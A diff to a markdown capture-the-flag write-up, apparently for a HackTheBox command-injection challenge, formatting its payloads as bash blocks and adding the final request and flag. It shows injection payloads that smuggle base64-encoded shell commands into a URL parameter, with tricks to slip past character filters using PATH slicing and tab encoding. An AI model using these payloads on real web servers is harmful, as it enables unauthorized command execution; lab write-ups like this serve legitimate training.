@@ -56,7 +56,9 @@ First, encode the command as follows.
 
 If you set the payload as described above, it is as follows.
 
-%7c%7cbash<<<$(base64 -d<<\<bXYgL2ZsYWcudHh0IC92YXIvd3d3L2h0bWwvZmlsZXMvdG1w)
+```bash
+%7c%7cbash<<<$(base64 -d<<<bXYgL2ZsYWcudHh0IC92YXIvd3d3L2h0bWwvZmlsZXMvdG1w)
+```
 
 But the above method didn't work.
 
@@ -70,8 +72,10 @@ As above, '/' was bypassed and re-encoded.
 
 (To briefly explain, the PATH environment variable is used and sliced ​​to load the first letter, '/'.)
 
-%7c%7cbash<<<$(base64 -d<<\<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRI\
+```bash
+%7c%7cbash<<<$(base64 -d<<<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRI
 OjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w)
+```
 
 This also didn't work...
 
@@ -87,11 +91,12 @@ I was showing an error on the screen, but I was making it difficult for no reaso
 
 Let's encode the cat /flag.txt command and send it back.
 
-<figure><img src="../.gitbook/assets/Untitled (8).png" alt=""><figcaption></figcaption></figure>
-
 I was able to get the flag.
 
-```
+```bash
+echo -n 'cat ${PATH:0:1}flag.txt' | base64
+Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=
+GET /index.php?to=%7c%7cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)&from=605311066.txt&finish=1&move=1
 HTB{c0mm4nd3r_1nj3c70r}
 ```
 
